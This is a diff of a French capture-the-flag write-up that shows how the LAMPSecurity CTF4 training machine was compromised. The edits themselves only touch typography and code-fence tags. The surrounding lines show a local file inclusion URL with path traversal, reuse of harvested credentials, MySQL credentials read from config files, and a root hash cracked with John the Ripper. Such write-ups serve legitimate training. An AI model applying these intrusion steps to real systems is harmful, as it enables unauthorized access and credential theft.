@@ -145,7 +145,7 @@ Contenu trouve avec /var/log/dmesg
 
 La lecture du fichier de configuration d'*Apache* me permet de connaître la racine web (*/var/www/html*).  
 
-A partir de là plusieurs angles d'attaque sont possibles. J'ai choisi de m'orienter illico sur le dossier restricted.  
+À partir de là plusieurs angles d'attaque sont possibles. J'ai choisi de m'orienter illico sur le dossier restricted.  
 
 Via la faille include (*/index.html?page=../../../../../../var/www/html/restricted/.htaccess%00&title=Blog*) on obtient le *.htaccess* suivant :  
 
@@ -202,14 +202,14 @@ Let Don or James know if you're having problems.
 
 Apparemment les identifiants de machine servent un peu à tout... Je me connecte en SSH avec les identifiants de *ghighland* et paff ! Ça passe encore !  
 
-```
+```console
 [ghighland@ctf4 ~]$ uname -a
 Linux ctf4.sas.upenn.edu 2.6.15-1.2054_FC5 #1 Tue Mar 14 15:48:33 EST 2006 i686 i686 i386 GNU/Linux
 ```
 
-Je trouve des identifiants MySQL dans */var/www/html/conf/config.ini* :  
+Je trouve des identifiants MySQL dans `/var/www/html/conf/config.ini` :  
 
-```
+```ini
 dbhost  =       localhost
 db      =       ehks
 dbuser  =       root
@@ -254,7 +254,7 @@ Dans la base *calendar* rien de bien intéressant... Un compte admin avec le pas
 
 Comme le laissait supposer la présence du *SquirrelMail*, les utilisateurs ont chacun une boite de messagerie.  
 
-```
+```console
 [ghighland@ctf4 www]$ ls /var/spool/mail/ -lh
 total 1.8M
 -rw------- 1 achen     mail 838K Jul  7 11:32 achen
@@ -345,7 +345,7 @@ Le coup de grace
 
 Dans son *.bash\_history* on trouve des appels à *su* et *sudo*. On s’aperçoit vite que ce dernier est effectivement administrateur :  
 
-```
+```console
 [dstevens@ctf4 ~]$ sudo -l
 Password:
 User dstevens may run the following commands on this host:
@@ -359,7 +359,7 @@ root:$1$DSHH/MlC$DH8ClhHKeagYW4PwxICZC0:14309:0:99999:7:::
 
 Le mot de passe se casse facilement :  
 
-```
+```console
 $ /opt/jtr/john --wordlist=mega_dict.txt  hash.txt 
 Loaded 1 password hash (FreeBSD MD5 [128/128 AVX intrinsics 12x])
 guesses: 0  time: 0:00:00:02 0.53% (ETA: Mon Jul  7 22:12:54 2014)  c/s: 35325  trying: 015922726 - 015924737
@@ -367,7 +367,7 @@ root1234         (root)
 guesses: 1  time: 0:00:07:08 DONE (Mon Jul  7 22:13:45 2014)  c/s: 35408  trying: root12 - root162net725
 ```
 
-Alternativement il est possible de passer root via le compte *achen*.  
+Alternativement, il est possible de passer root via le compte *achen*.  
 
 Premièrement ce dernier a des accès encore plus ouverts (lancement de commandes en tant que root sans avoir à saisir le moindre mot de passe) :  
 
@@ -376,9 +376,9 @@ User achen may run the following commands on this host:
     (ALL) NOPASSWD: ALL
 ```
 
-En plus dans son historique de commande on retrouve le mot de passe root :  
+En plus dans son historique de commande, on retrouve le mot de passe root :  
 
-```
+```bash
 --- snip ---
 sudo sy
 su
